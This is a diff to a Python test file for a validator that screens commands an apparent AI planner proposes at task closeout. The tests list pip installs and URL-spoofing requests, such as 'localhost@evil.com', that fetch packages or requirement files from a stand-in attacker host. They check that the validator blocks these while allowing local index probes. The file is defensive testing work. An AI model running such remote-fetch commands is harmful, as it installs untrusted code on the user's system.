@@ -162,6 +162,14 @@ def test_validate_closeout_command_rejects_mutating_and_unsafe_planner_commands(
         "uv pip install requests": "closeout_command_package_install",
         "poetry add requests": "closeout_command_package_install",
         "pipenv install requests": "closeout_command_package_install",
+        "python -m pip install --dry-run --index-url https://evil.com/simple vectorops==0.1.0": "closeout_command_package_install",
+        "python -m pip install --dry-run --report pip-report.json --index-url http://localhost:8080/simple vectorops==0.1.0": "closeout_command_package_install",
+        "python -m pip install --dry-run --no-index https://evil.com/pkg.whl": "closeout_command_package_install",
+        "python -m pip install --dry-run --no-index -r https://evil.com/requirements.txt": "closeout_command_package_install",
+        "python -m pip install --dry-run --no-index --requirement=https://evil.com/requirements.txt": "closeout_command_package_install",
+        "python -m pip install --dry-run --no-index -rhttps://evil.com/requirements.txt": "closeout_command_package_install",
+        "python -m pip install --dry-run --no-index --constraint=https://evil.com/constraints.txt": "closeout_command_package_install",
+        "python -m pip install --dry-run --no-index -chttps://evil.com/constraints.txt": "closeout_command_package_install",
         "git ls-remote https://example.com/repo.git": "closeout_command_network",
         "rm -rf build # '": "closeout_command_dangerous",
         "python -m pip install -e .": "closeout_command_package_install",
@@ -245,6 +253,96 @@ def test_validate_closeout_command_allows_planner_local_import_without_dash_b() 
     )
 
     assert validation.allowed is True
+
+
+def test_validate_closeout_command_allows_planner_local_service_and_dry_run_package_probe() -> None:
+    command = (
+        "python3 -B -c \"import subprocess, urllib.request; "
+        "assert 'vectorops' in urllib.request.urlopen('http://localhost:8080/simple/vectorops/', timeout=5)"
+        ".read().decode(); "
+        "subprocess.run(['python', '-m', 'pip', 'install', '--dry-run', '--ignore-installed', "
+        "'--no-cache-dir', '--index-url', 'http://localhost:8080/simple', 'vectorops==0.1.0'], check=True)\""
+    )
+
+    validation = validate_closeout_command(
+        FinishCloseoutCommand(command=command, source="finish_verifier_planner")
+    )
+
+    assert validation.allowed is True
+
+
+def test_validate_closeout_command_allows_planner_assigned_local_service_probe() -> None:
+    command = (
+        "python3 -B -c \"import urllib.request; "
+        "resp = urllib.request.urlopen('http://127.0.0.1:8080/simple/vectorops/', timeout=5); "
+        "assert 'vectorops' in resp.read().decode()\""
+    )
+
+    validation = validate_closeout_command(
+        FinishCloseoutCommand(command=command, source="finish_verifier_planner")
+    )
+
+    assert validation.allowed is True
+
+
+@pytest.mark.parametrize(
+    "command",
+    (
+        "python3 -B -c \"import urllib.request; urllib.request.urlopen('http://localhost.evil.com/simple/')\"",
+        "python3 -B -c \"import urllib.request; urllib.request.urlopen('http://localhost@evil.com/simple/')\"",
+        "python3 -B -c \"import urllib.request; urllib.request.urlopen('http://127.0.0.1@evil.com/simple/')\"",
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--index-url', 'https://evil.com/simple', 'vectorops==0.1.0'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--index-url', 'http://localhost:8080/simple', '--extra-index-url', "
+            "'https://evil.com/simple', 'vectorops==0.1.0'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--no-index', '--find-links', 'https://evil.com/wheels', "
+            "'vectorops==0.1.0'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--report', 'pip-report.json', '--index-url', "
+            "'http://localhost:8080/simple', 'vectorops==0.1.0'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--no-index', 'https://evil.com/pkg.whl'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--no-index', '-r', 'https://evil.com/requirements.txt'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--no-index', '--requirement=https://evil.com/requirements.txt'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--no-index', '-rhttps://evil.com/requirements.txt'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--no-index', '--constraint=https://evil.com/constraints.txt'], check=True)\""
+        ),
+        (
+            "python3 -B -c \"import subprocess; subprocess.run(['python', '-m', 'pip', 'install', "
+            "'--dry-run', '--no-index', '-chttps://evil.com/constraints.txt'], check=True)\""
+        ),
+    ),
+)
+def test_validate_closeout_command_rejects_planner_remote_service_and_package_probes(command: str) -> None:
+    validation = validate_closeout_command(
+        FinishCloseoutCommand(command=command, source="finish_verifier_planner")
+    )
+
+    assert validation.allowed is False
+    assert "closeout_command_inline_program" in validation.blockers
 
 
 def test_validate_closeout_command_allows_planner_quoted_multiline_python() -> None:
